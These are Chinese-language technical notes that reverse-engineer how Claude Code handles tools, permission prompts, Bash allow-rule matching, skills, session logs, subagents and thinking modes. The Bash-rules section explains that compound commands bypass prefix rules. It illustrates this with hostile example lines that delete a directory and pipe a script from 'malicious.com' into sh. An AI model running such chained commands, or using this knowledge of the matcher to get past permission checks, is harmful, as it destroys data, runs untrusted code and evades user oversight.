# Claude Code 機制分析
<!-- Edit tool test OK -->

## 1. Deferred Tools（延遲載入工具）

Claude Code 的工具預設是 **deferred** 狀態，不會在對話開始時全部載入到 context。

- 好處：節省 token（工具 schema 很長，全部預載會消耗大量 context）
- 代價：使用前需先透過 ToolSearch 載入，多一個 round trip

### 完整工具清單

工具分三類：
- **系統預載（Pre-loaded）**：schema 已在 context 中，可直接呼叫，共 9 個
- **Deferred**：schema 未在 context 中，需先用 ToolSearch 載入（系統以 `<available-deferred-tools>` 標記），共 16 個
- **MCP 工具**：由外部 MCP server 提供，格式為 `mcp__{server}__{tool}`；MCP server 連線時 schema 預載入 context（不經 ToolSearch），未連線時工具不存在

權限符號說明：
- **自動允許**：預設不詢問，直接執行
- ⚠️ **預設詢問**：需使用者手動允許，可透過 `permissions.allow` 設定關閉
- 🔒 **判斷性確認**：非權限系統控制，由 Claude 自行判斷是否需確認（無法透過設定關閉）

| 工具 | 類型 | 權限 | 作用 |
|------|------|------|------|
| **Read** | 預載 | 自動允許 | 讀取本地檔案內容 |
| **Glob** | 預載 | 自動允許 | 用 glob pattern 搜尋檔案路徑 |
| **Grep** | 預載 | 自動允許 | 用 regex 搜尋檔案內容（ripgrep） |
| **ToolSearch** | 預載 | 自動允許 | 載入 deferred 工具（元工具）；可一次載入多個：`select:A,B,C` |
| **TaskGet** | Deferred | 自動允許 | 取得任務詳情 |
| **TaskList** | Deferred | 自動允許 | 列出所有使用者任務 |
| **TaskOutput** | Deferred | 自動允許 | 讀取背景 Bash 任務輸出 |
| **CronList** | Deferred | 自動允許 | 列出所有排程 |
| **Edit** | 預載 | ⚠️ 可設定 | 對檔案進行精確字串替換編輯；設定：`Edit` |
| **Write** | 預載 | ⚠️ 可設定 | 寫入/覆蓋整個檔案；設定：`Write` |
| **Bash** | 預載 | ⚠️ 可設定 | 執行 shell 命令（支援 `run_in_background`，完成後以 `<task-notification>` 通知）；設定：`Bash(command:*)` |
| **Agent** | 預載 | ⚠️ 可設定 | 啟動子 agent 處理複雜任務（general-purpose / Explore / Plan 等）；設定：`Agent` |
| **Skill** | 預載 | ⚠️ 可設定 | 執行 `.claude/skills/` 下定義的 skill；設定：`Skill(skill-name)` |
| **AskUserQuestion** | Deferred | ⚠️ 可設定 | 主動向使用者提問；設定：`AskUserQuestion` |
| **WebFetch** | Deferred | ⚠️ 可設定 | 抓取指定 URL 的網頁內容；設定：`WebFetch(domain:example.com)` |
| **WebSearch** | Deferred | ⚠️ 可設定 | 搜尋網路；設定：`WebSearch` |
| **NotebookEdit** | Deferred | ⚠️ 可設定 | 編輯 Jupyter notebook（`.ipynb` 檔案必須用此工具，Edit 會報錯）；設定：`NotebookEdit` |
| **EnterPlanMode** | Deferred | ⚠️ 可設定 | 進入 Plan 模式；Write 可存計畫至 `~/.claude/plans/{slug}.md` |
| **ExitPlanMode** | Deferred | ⚠️ 可設定 | 離開 Plan 模式，提交計畫讓使用者審核 |
| **EnterWorktree** | Deferred | ⚠️ 可設定 | 在 `.claude/worktrees/{name}` 建立 git worktree 隔離環境 |
| **TaskCreate** | Deferred | ⚠️ 可設定 | 建立使用者任務（ID 為數字，如 `1`）；設定：`TaskCreate` |
| **TaskUpdate** | Deferred | ⚠️ 可設定 | 更新使用者任務狀態；設定：`TaskUpdate` |
| **TaskStop** | Deferred | ⚠️ 可設定 | 停止**背景 Bash 任務**（ID 為 hash，如 `bz6rlnhqb`）；無法停止 TaskCreate 任務；設定：`TaskStop` |
| **CronCreate** | Deferred | ⚠️ 可設定 | 建立定時排程（session-only，Claude 退出後消失）；設定：`CronCreate` |
| **CronDelete** | Deferred | ⚠️ 可設定 | 刪除排程；設定：`CronDelete` |
| **mcp__ide__getDiagnostics** | MCP | ⚠️ 可設定 | 取得 IDE 診斷資訊（lint/type 錯誤等）；設定：`mcp__ide__getDiagnostics` |
| **mcp__ide__executeCode** | MCP | ⚠️ 可設定 | 在 IDE 執行程式碼；設定：`mcp__ide__executeCode` |

來源：`b360f366...jsonl`（完整工具調用測試）

### 權限確認與 JSONL 記錄

權限確認對話框（使用者允許/拒絕工具呼叫的提示）**不會記錄在 JSONL 中**。

JSONL 只記錄：
- `TOOL_CALL`：Claude 發出的工具呼叫
- `TOOL_RESULT`：工具執行結果（允許後的成功訊息，或拒絕後的錯誤）

中間的確認交互對 JSONL 透明，無法從記錄中得知使用者是否被詢問過。

來源：`ef82a45d...jsonl`

### 權限確認的內部通訊協定（IPC）

權限確認走的是 **進程間通訊（IPC）**，與 JSONL 無關。從 Claude Code JS bundle 逆向得到以下結構：

**`permission_request`**（Claude → UI）
```json
{
  "type": "permission_request",
  "request_id": "...",
  "agent_id": "...",
  "tool_name": "Edit",
  "tool_use_id": "...",
  "description": "...",
  "input": { ...工具參數... },
  "permission_suggestions": []
}
```

**`permission_response`**（UI → Claude）
```json
// 允許
{ "type": "permission_response", "request_id": "...", "subtype": "success",
  "response": { "updated_input": {...}, "permission_updates": [...] } }

// 拒絕
{ "type": "permission_response", "request_id": "...", "subtype": "error",
  "error": "Permission denied" }
```

| 欄位 | 說明 |
|------|------|
| `permission_suggestions` | UI 顯示的建議 allow 規則選項 |
| `updated_input` | 使用者可在確認前修改工具參數 |
| `permission_updates` | 允許後寫回 `settings.json` 的規則 |

其他相關 IPC message type：
- `sandbox_permission_request/response`：sandbox 模式網路存取確認
- `team_permission_update`：團隊權限同步
- `plan_approval_request/response`：Plan 模式計畫審核
- `mode_set_request`：切換操作模式

來源：`6370316b...jsonl` tool-results（Claude Code JS bundle 逆向）

### Bash 權限規則的匹配邏輯

來源：Claude Code 執行檔逆向（`2.1.72`，函數 `Nc$`、`IKL`、`aVH`）

#### 規則格式與類型

`ruleContent` 解析為三種類型（函數 `IKL`）：

| 格式 | 類型 | 說明 |
|------|------|------|
| `ls:*` | `prefix` | 命令以 `ls` 開頭（legacy 格式） |
| `ls *` | `wildcard` | glob/wildcard 匹配 |
| `ls -la` | `exact` | 完全相符 |

#### prefix 規則的實際匹配條件

`Bash(ls:*)` 中的 `ls:*` → 提取 prefix = `ls`，判斷條件：

```
w === "ls"              // 純 ls 命令
w.startsWith("ls ")    // ls 開頭加空格（如 ls 'path'）
w === "xargs ls"       // xargs 加上 ls
w.startsWith("xargs ls ")
```

#### 複合命令不匹配 prefix 規則（安全設計）

```js
// 判斷是否為複合命令（含 &&, ||, ;, |）
K.set(command, iCA(command).length > 1)

case "prefix":
  if (K.get(w)) return false;  // 複合命令直接跳過！
```

所以 `ls ... && echo "---" && ls ...` → 被判定為複合命令 → `Bash(ls:*)` **不生效**，仍會詢問。

**這是刻意的安全設計，用於防止越獄（jailbreak）**：若複合命令也能匹配 prefix 規則，攻擊者可在合法命令後接危險操作以繞過限制：

```bash
# 允許規則：Bash(git:*)
git status && rm -rf /important-dir   # ← 前綴合法，但後半段危險
git log && curl malicious.com | sh    # ← 同理
```

強制複合命令永遠需要額外確認，確保 prefix 規則只授權「單一操作」，而非「以某命令開頭的任意串接」。

#### Windows 路徑可能導致解析失敗

`bI()` 用 bash tokenizer 解析命令，若遇到 Windows 反斜線路徑（如 `ls 'C:\Users\...'`）可能失敗，回傳 `hasDangerousRedirection: true`，觸發不同的判斷路徑。

#### 結論：哪些 Bash 命令會仍被詢問

即使設定了 `Bash(ls:*)` 仍會被問的情況：
1. **複合命令**：`ls ... && echo ... && ls ...`（`&&`/`||`/`;`/`|` 串接）
2. **Windows 路徑**：可能因 tokenizer 解析失敗而走不同路徑
3. **解決方法**：改用 `"Bash"` 允許所有 Bash 指令（風險較高），或接受上述限制

### 工具載入流程

```
Claude 需要某工具
    ↓
ToolSearch("select:ToolName")   ← 將工具 schema 載入 context
    ↓
直接呼叫 ToolName(...)
```

### 載入後的有效範圍

- 同一 session 內：載入一次後可直接呼叫，不需重複 ToolSearch
- 跨 session：每次新對話都要重新載入，context 不跨 session 保留

---

## 2. ToolSearch

用來發現並載入 deferred 工具的**元工具（工具的工具）**，是唯一預設就存在的工具。

### 兩種查詢模式

| 模式 | 範例 | 說明 |
|------|------|------|
| 直接選取 | `select:Glob` | 知道工具名稱時直接載入 |
| 關鍵字搜尋 | `"list directory"` | 不確定工具名稱時搜尋 |
| 多工具選取 | `select:Read,Edit,Grep` | 一次載入多個工具 |

### 效率問題

每次 ToolSearch 都是一個額外步驟，會：
- 多一次 LLM 推理
- 多消耗 token
- 增加回應時間

---

## 3. Skill 系統

### Skill 是什麼

放在 `.claude/skills/<name>/SKILL.md` 的 Markdown 指令檔，告訴 Claude 如何完成特定任務。

### 觸發方式

| 方式 | 觸發者 | 機制 |
|------|--------|------|
| `/skill-name` | 使用者輸入 | CLI 直接讀取 SKILL.md 展開為 `isMeta: true` 訊息注入 context |
| `Skill` tool | Claude 主動 | Claude 先 ToolSearch 載入 Skill 工具，再呼叫執行某 skill |

### 關鍵差異

使用者直接輸入 `/skill-name` 時，**CLI 在框架層面展開**，Claude 收到的已是展開後的指令內容，**不需要呼叫 Skill 工具**。

### Skill 與 ToolSearch 的關係

```
/session-analyze file.jsonl       ← 使用者輸入
    ↓
CLI 展開 SKILL.md 為 meta 訊息   ← 框架處理
    ↓
Claude 看到指令，決定要用 Bash
    ↓
ToolSearch("select:Bash")         ← 載入工具
    ↓
Bash(python3 parse-session.py ...) ← 執行
```

Skill 告訴 Claude **要做什麼**，ToolSearch 讓 Claude **有能力去做**。

### SKILL.md 前置設定（frontmatter）

```yaml
---
name: skill-name
description: 何時觸發此 skill 的說明
argument-hint: <arg1> [arg2]
allowed-tools: Bash(python3 *), Read, Glob
disable-model-invocation: true   # 可選
context: fork                    # 可選
agent: Explore                   # 可選
---
```

### 動態內容注入（`!` 前綴）

SKILL.md 中可用 `!` 前綴在展開時自動執行命令並注入結果：

```markdown
- **PR Diff**: !`gh pr diff $ARGUMENTS[0]`
```

### 腳本預處理模式

對話內容可能很長，建議在 skill 中先用腳本壓縮資料再給 LLM 分析：

```markdown
!`python3 "${CLAUDE_SKILL_DIR}/scripts/parse.py" "$ARGUMENTS"`
```

---

## 4. Session JSONL 格式

Claude Code 將每次對話儲存為 JSONL 檔，每行一個 JSON 物件。

### 記錄類型

| type | 說明 |
|------|------|
| `file-history-snapshot` | 檔案狀態快照（長 session 可出現多次，6370316b 有 65 條） |
| `user` | 使用者訊息（含 `isMeta: true` 的 skill 注入，也含 tool_result） |
| `assistant` | Claude 回應（含 tool_use、thinking、text） |
| `progress` | 背景進度事件，不進入 LLM context（見下方） |
| `system` | 系統事件，如 turn_duration（見下方） |

### progress 記錄子類型

`progress` 記錄的 `data.type` 欄位說明：

| data.type | 說明 | 關鍵欄位 |
|-----------|------|---------|
| `hook_progress` | Hook 執行事件 | `hookName`（如 `PostToolUse:Read`） |
| `bash_progress` | Bash 命令執行中輸出 | `output`/`fullOutput`、`elapsed` |
| `agent_progress` | Subagent 每一步操作回報 | `agentId`、`message`（含 subagent 的 tool_use/tool_result）、`parentToolUseID` |

來源：`6370316b...jsonl`（hook/bash）、`00bbda8a...jsonl`（agent_progress）

### system 記錄

`system` 記錄目前已知的子類型：

| subtype | 說明 | 關鍵欄位 |
|---------|------|---------|
| `turn_duration` | 記錄一個 turn 的耗時 | `durationMs`、`slug` |

`slug` 是 session 的人類可讀名稱（例如 `noble-wiggling-squid`），由 Claude Code 自動生成。

來源：`6370316b...jsonl`

### toolUseResult 的兩種格式

`toolUseResult` 欄位通常為 dict，但在錯誤情況下（如 Read 超過 token 上限）會變成純字串：

```json
// 正常情況（dict）
"toolUseResult": { "stdout": "...", "stderr": "", "exitCode": 0 }

// 錯誤情況（string）
"toolUseResult": "Error: File content (86071 tokens) exceeds maximum allowed tokens (25000)..."
```

來源：`6370316b...jsonl`（Read 工具超過 25000 token 限制時觸發）

### 同一 message ID 可能出現在多條記錄

同一個 assistant message 可能拆成兩條記錄（例如第一條含 thinking，第二條含 tool_use），解析時需以 `tool_use_id` 去重，而非 `message_id`。

### Token 統計欄位

```json
"usage": {
  "input_tokens": 1,
  "output_tokens": 116,
  "cache_read_input_tokens": 5576,
  "cache_creation_input_tokens": 604
}
```

---

## 5. Agent Architecture

### 架構概覽

```
使用者 ←→ mainThreadAgent（主對話 Claude）
               ↓ 可 spawn
          Teammates / Subagents
```

### Agent 類型（來源：binary 分析）

| 代號 | 類型 | 說明 |
|------|------|------|
| `a` | `local_agent` | 本機子 agent，在 worktree 或隔離環境執行 |
| `b` | `local_bash` | 本機 bash 執行環境 |
| `r` | `remote_agent` | 遠端 agent（SSH 等）|
| `t` | `in_process_teammate` | 同進程內的 teammate |

```js
// binary 原始定義
nv1 = { local_bash:"b", local_agent:"a", remote_agent:"r", in_process_teammate:"t" }
```

### Agent tool 的 subagent_type

透過 `Agent` 工具呼叫子 agent 時，可指定 `subagent_type`（共 5 種）：

| subagent_type | 可用工具 | 說明 |
|---------------|----------|------|
| `general-purpose` | 全部（`*`） | 通用型，適合複雜多步驟任務 |
| `statusline-setup` | Read、Edit | 專門設定 Claude Code 狀態列 |
| `Explore` | 除 Agent、ExitPlanMode、Edit、Write、NotebookEdit | 快速探索 codebase；支援 quick / medium / very thorough 三種深度 |
| `Plan` | 除 Agent、ExitPlanMode、Edit、Write、NotebookEdit | 軟體架構規劃，回傳實作計畫 |
| `claude-code-guide` | Glob、Grep、Read、WebFetch、WebSearch | 回答 Claude Code / SDK / API 問題；支援 `resume` 繼續前次 agent |

來源：`b360f366...jsonl`（使用 Explore 子 agent）；subagent_type 清單來自系統 prompt

### Subagent 運作特性

| 特性 | 說明 |
|------|------|
| **獨立 context** | 每個 subagent 有自己的 context window，不共享主 agent 對話歷史 |
| **工具隔離** | 每種 subagent_type 有各自的工具白名單，無法呼叫白名單外的工具 |
| **agentId** | 呼叫後回傳 agentId（如 `aabcf4bda0b27ca01`，`a` 前綴 = `local_agent`），可用 `resume` 參數繼續 |
| **結果回傳** | Subagent 完成後將結果作為 TOOL_RESULT 回傳給主 agent（含 totalDurationMs、totalTokens、totalToolUseCount） |
| **不同 model** | Subagent 可能使用不同 model；Explore subagent 實測使用 `claude-haiku-4-5-20251001`，主 agent 為 `claude-sonnet-4-6` |
| **無獨立 JSONL** | Subagent 活動**不**產生獨立 JSONL 檔案，全部以 `progress`（`data.type: "agent_progress"`）記錄在主 session JSONL |
| **主 LLM 不可見細節** | Subagent 的 tool_use / tool_result 在 `progress` 記錄中，主 agent 只看到最終彙整結果（間接證據：最終 assistant token 計數極低；直接驗證待補） |

來源：`00bbda8a...jsonl`（實測 Explore subagent）

### Console UI 渲染

`agent_progress` 記錄在 console 以縮排樹狀結構即時呈現：

```
Explore(List files in project)
  ⎿  Prompt: 列出...
  ⎿  Bash(find /d/project/test_claude_skill ...)
  ⎿  Read(/d/project/test_claude_skill/CLAUDE.md)
  ⎿  Read(/d/project/test_claude_skill/analysis.md)
  ⎿  Bash(ls -lah ...)
  ⎿  Response: 完美。現在...
```

`⎿` 符號表示 subagent 的子操作，使用者可即時看到 subagent 執行進度，但主 LLM 只拿到最後的 Response 內容。

### agent_progress 記錄結構

Subagent 每一步操作都透過 `agent_progress` 回報給主 session：

```json
{
  "type": "progress",
  "data": {
    "type": "agent_progress",
    "agentId": "aabcf4bda0b27ca01",
    "message": {
      "type": "assistant",          // 或 "user"（tool_result）
      "message": { "model": "claude-haiku-4-5-20251001", "content": [...] }
    }
  },
  "toolUseID": "agent_msg_...",
  "parentToolUseID": "toolu_011re..."   // Agent tool call 的 ID
}
```

### Agent tool 的 toolUseResult 結構

Agent 工具完成後，toolUseResult 比一般工具更豐富：

```json
{
  "status": "completed",
  "agentId": "aabcf4bda0b27ca01",
  "content": [{ "type": "text", "text": "..." }],
  "totalDurationMs": 16247,
  "totalTokens": 23272,
  "totalToolUseCount": 5,
  "usage": { ... }
}
```

### Agent 間通訊協議

agents 透過訊息傳遞溝通：

| 訊息類型 | 方向 | 說明 |
|---------|------|------|
| `task_assignment` | 主 → sub | 派任務 |
| `task_progress` | sub → 主 | 回報進度 |
| `task_status` | 雙向 | 狀態更新 |
| `task_notification` | sub → 主 | 任務通知 |
| `idle_notification` | sub → 主 | 閒置（含 summary、completedTaskId）|
| `agent_progress` | sub → 主 | 執行進度 |
| `permission_request` | sub → 主 | 請求操作許可 |
| `permission_response` | 主 → sub | 回覆許可 |
| `shutdown_request` | 任意 | 要求關閉 |
| `shutdown_approved/rejected` | 任意 | 關閉確認 |
| `teammate_terminated` | 系統 | teammate 結束通知 |

### Agent Memory 目錄

每個 agent 有三種範圍的獨立記憶體：

| 範圍 | 路徑 | 特性 |
|------|------|------|
| project | `.claude/agent-memory/` | 版控共享 |
| user | `~/.claude/agent-memory/` | 跨專案 |
| local | `.claude/agent-memory-local/` | 不進版控 |

### Teammate 生成模式

`teammateMode` 設定值：

| 值 | 說明 |
|----|------|
| `tmux` | 用 tmux 開新視窗執行 |
| `in-process` | 同進程內執行 |
| `auto` | 自動選擇 |

---

## 6. Hooks

Claude Code 支援在特定事件後自動執行 shell 命令（PostToolUse 等），結果會以 `progress` 記錄注入 session JSONL。

---

## 7. Tool Call 與 LLM 推理的關係

每個 tool call 結果（TOOL_RESULT）後，都會觸發一次 LLM 推理，再決定下一步動作。

```
TOOL_CALL: ToolSearch({"query": "select:Glob"})
    ↓
TOOL_RESULT: Glob 已就緒
    ↓
LLM 推理（決定下一步）         ← 一次 LLM round trip
    ↓
TOOL_CALL: Glob({"pattern": "**/*"})
    ↓
TOOL_RESULT: 檔案列表
    ↓
LLM 推理（決定下一步）         ← 又一次 LLM round trip
    ↓
...
```

ToolSearch 多一步 = 多一次 tool call + 多一次 LLM 推理。

來源：`6370316b...jsonl`，可從各 TOOL_CALL 之間的時間間隔（2~3 秒）觀察到 LLM 推理的存在。

---

## 8. Extended Thinking（THINKING 機制）

### 什麼是 THINKING

Claude 在回應前的內部推理過程，以 `thinking` 類型的 content block 記錄於 JSONL。

```json
{
  "type": "thinking",
  "thinking": "...",
  "signature": "EpYCCkYI..."
}
```

- `thinking`：推理文字內容
- `signature`：加密簽名，用於驗證 thinking 真實性，防止偽造

### 兩種狀態

| 狀態 | `thinking` 欄位 | `signature` 欄位 | 說明 |
|------|----------------|----------------|------|
| 明文 | 有內容 | 有 | 舊版 `type=enabled` 模式 |
| 加密 | 空字串 `""` | 有（且較長）| 新版 `adaptive` 模式 |

兩種狀態都有 `signature`，差別只在 `thinking` 是否為空。

來源：`5713c20a...jsonl`（明文）vs `6370316b...jsonl`（加密），透過 binary 分析確認。

### Thinking 模式（來源：binary 分析）

Claude Code 使用三種 thinkingConfig type：

| type | 說明 |
|------|------|
| `disabled` | 關閉 thinking |
| `enabled` | 舊版，已棄用，thinking 內容明文回傳 |
| `adaptive` | 新版預設，server-side 處理，thinking 加密不回傳明文 |

Beta flags：
- `interleaved-thinking-2025-05-14`（舊版）
- `adaptive-thinking-2026-01-28`（新版，目前使用）

### 設定方式

**設定鍵：`alwaysThinkingEnabled`**（存於 `settings.json`）

```json
{ "alwaysThinkingEnabled": false }
```

| 值 | 行為 |
|----|------|
| 缺席或 `true` | thinking 自動啟用（預設）|
| `false` | thinking 停用 |

也可在 Claude Code UI Settings 對話框中切換（label: `Thinking mode`）。

**相關設定：**
```json
{ "showThinkingSummaries": true }
```
控制是否在 transcript view（`ctrl+o`）顯示 thinking 摘要，預設 `false`。
